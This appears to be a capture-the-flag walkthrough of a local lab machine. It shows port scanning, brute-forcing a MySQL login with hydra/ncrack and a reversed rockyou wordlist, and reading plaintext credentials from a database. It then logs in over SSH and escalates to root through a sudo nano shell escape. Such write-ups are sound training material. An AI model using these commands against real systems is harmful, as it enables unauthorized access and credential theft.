____
IP=172.17.0.2
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn $IP | grep -oP '\d+(?=/tcp)' | paste -sd ',' -

22,80,3306

nmap -sCV $IP -oN nmap -Pn -p22,80,3306

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-19 07:24 EDT
Nmap scan report for 172.17.0.2
Host is up (0.00052s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9e:6a:3f:89:de:9d:05:d9:94:32:73:8d:31:e0:a5:eb (ECDSA)
|_  256 e7:ef:4f:4a:25:86:c9:55:b0:88:0a:8c:79:03:d0:9f (ED25519)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Web de Capybaras
|_http-server-header: Apache/2.4.52 (Ubuntu)
3306/tcp open  mysql   MySQL 5.5.5-10.6.16-MariaDB-0ubuntu0.22.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.6.16-MariaDB-0ubuntu0.22.04.1
|   Thread ID: 36
|   Capabilities flags: 63486
|   Some Capabilities: ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, LongColumnFlag, Speaks41ProtocolOld, ODBCClient, FoundRows, IgnoreSigpipes, InteractiveClient, Support41Auth, SupportsCompression, SupportsTransactions, SupportsLoadDataLocal, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: lkS<qFK&wJIpx*b5!Bga
|_  Auth Plugin Name: mysql_native_password
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

whatweb http://$IP            

http://172.17.0.2 [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[172.17.0.2], Title[Web de Capybaras]


user leak: **capybarauser**

viewing the source code view-source:http://172.17.0.2/

<p>He securizado mi password, ya no se encuentra al comienzo del rockyou..., espero que nadie use el comando tac y se fije en las últimas passwords del rockyou</p>

The 'tac' command is **the reverse of the 'cat' command**. It is also known as 'cat' backward. It will display the file content in reverse order. It prints the last line first, then second last and so on.

tac /usr/share/wordlists/rockyou.txt| head -100 > passwords.txt

first lines characters are corrupted so we have to delete 

```txt
^D*^C7¡Vamos!^C
^Ha6_123
^Habygurl69
^Hie168
^ZxCvBnM,
```
to 

```txt
7¡Vamos!
a6_123
abygurl69
ie168
xCvBnM,
```
if we dont delete then we get blocked 

```txt
[ERROR] Host '172.17.0.1' is blocked because of many connection errors; unblock with 'mariadb-admin flush-hosts'
[ERROR] Host '172.17.0.1' is blocked because of many connection errors; unblock with 'mariadb-admin flush-hosts'
[ERROR] Host '172.17.0.1' is blocked because of many connection errors; unblock with 'mariadb-admin flush-hosts'
[ERROR] Host '172.17.0.1' is blocked because of many connection errors; unblock with 'mariadb-admin flush-hosts'
[ERROR] Host '172.17.0.1' is blocked because of many connection errors; unblock with 'mariadb-admin flush-hosts'
[ERROR] Host '172.17.0.1' is blocked because of many connection errors; unblock with 'mariadb-admin flush-hosts'
```

```bash
tac /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt |head -n 10 | tr -cd '\11\12\15\40-\176' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | sed '/^$/d' | sed 's/[[:space:]]\+/ /g' > passwords.txt
```

```shell
hydra -l capybarauser -P passwords.txt mysql://$IP
```

```bash
ncrack -u capybarauser -P passwords.txt mysql://$IP
```

[3306][mysql] host: 172.17.0.2   login: capybarauser   password: ie168


```bash
mysql -u capybarauser -h $IP -p
```

```txt
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| pinguinasio_db     |
| sys                |
+--------------------+
5 rows in set (0.001 sec)

MariaDB [(none)]> use pinguinasio_db;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [pinguinasio_db]> show tables;
+--------------------------+
| Tables_in_pinguinasio_db |
+--------------------------+
| users                    |
+--------------------------+
1 row in set (0.001 sec)

MariaDB [pinguinasio_db]> select * from users;
+----+-------+------------------+
| id | user  | password         |
+----+-------+------------------+
|  1 | mario | pinguinomolon123 |
+----+-------+------------------+
```

```bash
ssh mario@$IP
```

# PrivEsc

sudo -l
User mario may run the following commands on 422e457f179c:
    (ALL : ALL) NOPASSWD: /usr/bin/nano

```
sudo nano
^R^X
reset; bash 1>&0 2>&0
```

![[Pasted image 20240619142353.png]]root@422e457f179c:~# whoami
root

